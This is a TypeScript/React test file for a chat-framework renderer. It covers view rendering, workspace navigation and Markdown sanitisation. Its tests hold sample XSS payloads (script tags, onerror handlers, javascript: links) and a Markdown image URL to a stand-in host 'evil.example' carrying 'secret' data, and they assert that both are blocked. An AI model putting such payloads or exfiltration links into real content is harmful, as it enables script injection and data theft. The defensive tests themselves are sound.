/** @jsxRuntime classic */
/** @jsx React.createElement */
/** @jsxFrag React.Fragment */
// deno-lint-ignore verbatim-module-syntax -- classic JSX requires this runtime import.
import * as React from "react";
import { defineView } from "@copilotz/copilotz/views";
import type { BrowserViewContext } from "@copilotz/copilotz/web";
import {
  MemorySubscriptions,
  record,
  tick,
} from "../../../client/testing/live-transport.test.ts";
import { renderToStaticMarkup } from "react-dom/server";
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  type BrowserRuntime,
  createBrowserRuntime,
} from "@copilotz/copilotz/web";
import {
  coreWebPlugin,
  messageReadSelection,
} from "@copilotz/copilotz/core/web";
import { adminWebPlugin } from "@copilotz/copilotz/admin/web";
import { usageWebPlugin } from "@copilotz/copilotz/usage/web";
import { uiWebPlugin, workspaceNavigation } from "@copilotz/copilotz/ui/web";
import { Button, Markdown } from "@copilotz/copilotz/web/kit";
import { ObservedView, reactRenderer } from "../index.ts";

test("React adapter server renders tracked chat/admin/usage screens in both densities", async () => {
  const live = new MemorySubscriptions();
  const publish = (
    collection: string,
    query: Record<string, unknown> | undefined,
    rows: Record<string, unknown>[],
    id?: string,
  ) =>
    live.publish({
      collection,
      ...(collection === "message" ? messageReadSelection : {}),
      ...(query ? { query } : {}),
      ...(id ? { id } : {}),
    }, {
      t: "snapshot",
      complete: true,
      rows: rows.map((row) => record(row as { id: string })),
      sequence: "1",
      checkpoint: "1",
    });
  publish("thread", undefined, [{ id: "t", name: "A conversation" }], "t");
  publish("thread", { limit: 100 }, [{ id: "t", name: "A conversation" }]);
  publish("message", { where: { threadId: "t" }, limit: 100 }, [{
    id: "m",
    content: [{
      assetId: "body",
      kind: "text",
      role: "message",
      mediaType: "text/plain",
      value: "Hello **reader**",
    }],
    role: "assistant",
  }]);
  publish("participant", { limit: 100 }, [{ id: "p", name: "Reader" }]);
  publish("usage", { limit: 100 }, [{
    id: "u",
    model: "Example model",
    totalTokens: 123,
    totalCostUsd: .01,
  }]);
  const runtime = await createBrowserRuntime({
    renderer: reactRenderer,
    plugins: [coreWebPlugin, adminWebPlugin, usageWebPlugin],
    live,
  });
  for (const mode of ["full", "panel"]) {
    for (
      const [shows, value, expected] of [
        ["thread", { id: "t" }, "Hello <strong>reader</strong>"],
        ["admin", null, "Administration"],
        ["thread", { id: "t" }, "A conversation"],
        [{ list: "thread" }, null, "A conversation"],
        ["usage", null, "123"],
      ] as const
    ) {
      const output = runtime.observe(() =>
        runtime.render({ shows, value }, { mode })
      );
      await tick();
      const html = renderToStaticMarkup(<ObservedView output={output} />);
      assert.ok(html.includes(expected), html);
      assert.ok(html.includes(`data-density="${mode}"`));
      output.dispose();
    }
  }
  runtime.dispose();
  assert.equal(live.subscriptions, 0);
});

test("workspace restores panes, navigation chooses focus/context, and swap exchanges density", async () => {
  const runtime: BrowserRuntime = await createBrowserRuntime({
    renderer: reactRenderer,
    plugins: [
      coreWebPlugin,
      adminWebPlugin,
      usageWebPlugin,
      uiWebPlugin("url"),
    ],
    live: new MemorySubscriptions(),
    show: workspaceNavigation(() => runtime),
    storage: {
      url: {
        load: () => [{
          id: "main",
          focus: { shows: "admin", value: null },
          context: null,
        }],
        save() {},
      },
    },
  });
  await runtime.actions.uiOpen({
    reference: { shows: "usage", value: null },
    source: "link",
  }).result();
  const output = runtime.observe(() =>
    runtime.render({ shows: "workspace", value: null })
  );
  let html = renderToStaticMarkup(<ObservedView output={output} />);
  assert.ok(html.includes('aria-label="Context"'));
  assert.ok(html.includes('data-density="panel"'));
  assert.ok(html.includes("Search ⌘K"));
  await runtime.actions.uiSwap({}).result();
  assert.equal(
    (runtime.collections.workspace.get("main").value?.focus as {
      shows: string;
    }).shows,
    "usage",
  );
  await runtime.actions.uiOpen({
    reference: { shows: "admin", value: null },
    source: "command",
  }).result();
  assert.equal(
    (runtime.collections.workspace.get("main").value?.focus as {
      shows: string;
    }).shows,
    "admin",
  );
  html = renderToStaticMarkup(<ObservedView output={output} />);
  assert.ok(html.includes("Administration"));
  runtime.dispose();
});

test("shared Markdown rejects raw HTML and unsafe URLs while preserving escaped code", () => {
  for (
    const source of [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "[click](javascript:alert%281%29)",
      "[click](data:text/html,test)",
      "<svg onload=alert(1)>",
      '<iframe srcdoc="x"></iframe>',
    ]
  ) {
    const html = renderToStaticMarkup(<Markdown>{source}</Markdown>);
    assert.doesNotMatch(
      html,
      /<script|<img|<svg|<iframe|href="javascript:|href="data:|onerror=/,
    );
  }
  const code = renderToStaticMarkup(
    <Markdown>{"```html\n<img src=x onerror=alert(1)>\n```"}</Markdown>,
  );
  assert.ok(code.includes("&lt;img"));
  assert.ok(!code.includes("<img"));
  const button = renderToStaticMarkup(
    <Button asChild>
      <a href="/safe">Open</a>
    </Button>,
  );
  assert.ok(button.includes('data-slot="button"'));
  assert.ok(button.includes("<a"));
});

test("message Markdown loads remote images only from the app's resources.markdown.imageOrigins", async () => {
  const message = {
    shows: "message",
    value: {
      id: "m",
      role: "assistant",
      content:
        "![chart](https://cdn.example/a.png) ![leak](https://evil.example/?q=secret)",
    },
  };
  for (const imageOrigins of [undefined, ["https://cdn.example"]]) {
    const runtime = await createBrowserRuntime({
      renderer: reactRenderer,
      plugins: [coreWebPlugin, {
        id: "app",
        resources: imageOrigins ? { markdown: { imageOrigins } } : {},
      }],
      live: new MemorySubscriptions(),
    });
    try {
      const output = runtime.observe(() => runtime.render(message));
      const html = renderToStaticMarkup(<ObservedView output={output} />);
      output.dispose();
      assert.doesNotMatch(html, /evil\.example/);
      assert.match(html, />leak</);
      if (imageOrigins) {
        assert.match(html, /<img [^>]*src="https:\/\/cdn\.example\/a\.png"/);
      } else {
        assert.doesNotMatch(html, /<img/);
        assert.match(html, />chart</);
      }
    } finally {
      runtime.dispose();
    }
  }
});

test("admin query Views render existing authorized Action results", async () => {
  const runtime = await createBrowserRuntime({
    renderer: reactRenderer,
    plugins: [adminWebPlugin],
    live: new MemorySubscriptions(),
    actions: {
      invoke: () =>
        Promise.resolve({
          seq: 1,
          value: {
            status: 200,
            data: [{ id: "a", name: "Example agent", role: "Assistant" }],
          },
        }),
      cancel: () => Promise.resolve(),
    },
  });
  const output = runtime.observe(() =>
    runtime.render({ shows: "adminQuery", value: { section: "agents" } })
  );
  await new Promise((resolve) => setTimeout(resolve, 0));
  const html = renderToStaticMarkup(<ObservedView output={output} />);
  assert.ok(html.includes("Example agent"));
  assert.ok(html.includes("Assistant"));
  runtime.dispose();
});

test("React View boundaries keep composer keystrokes out of siblings and update changed props", async () => {
  const counts = { root: 0, composer: 0, history: 0 };
  const runtime = await createBrowserRuntime({
    renderer: reactRenderer,
    plugins: [{
      id: "app",
      collections: {
        draft: {
          placement: "browser",
          initial: [{ id: "a", text: "" }],
          commands: {
            set: { mutate: ({ input }) => ({ set: { text: input } }) },
          },
        },
      },
      actions: {
        type: {
          id: "type",
          placement: "browser",
          execute(input, ctx) {
            ctx.command("draft", "a", "set", input);
          },
        },
      },
      views: {
        root: defineView<unknown, unknown, BrowserViewContext>({
          id: "root",
          shows: "root",
          modes: ["full"],
          renderer: "react",
          render(_value, ctx) {
            counts.root++;
            return (
              <main>
                {ctx.show({ shows: "history", value: null }) as React.ReactNode}
                {ctx.show({
                  shows: "composer",
                  value: null,
                }) as React.ReactNode}
              </main>
            );
          },
        }),
        history: defineView<unknown, unknown, BrowserViewContext>({
          id: "history",
          shows: "history",
          modes: ["full"],
          renderer: "react",
          render() {
            counts.history++;
            return <p>History</p>;
          },
        }),
        composer: defineView<unknown, unknown, BrowserViewContext>({
          id: "composer",
          shows: "composer",
          modes: ["full"],
          renderer: "react",
          render(_value, ctx) {
            counts.composer++;
            return (
              <span>{String(ctx.collections.draft.get("a").value?.text)}</span>
            );
          },
        }),
      },
    }],
  });
  try {
    const root = runtime.observe(() =>
      runtime.render({ shows: "root", value: null })
    );
    const snapshot = root.getSnapshot();
    let rootNotifications = 0;
    root.subscribe(() => rootNotifications++);
    await runtime.actions.type("a").result();
    await runtime.actions.type("ab").result();
    assert.deepEqual(counts, { root: 1, composer: 3, history: 1 });
    assert.equal(rootNotifications, 0);
    assert.equal(root.getSnapshot(), snapshot);
    const html = renderToStaticMarkup(<ObservedView output={root} />);
    assert.ok(html.includes("<span>ab</span>"), html);
    root.dispose();
  } finally {
    runtime.dispose();
  }
});
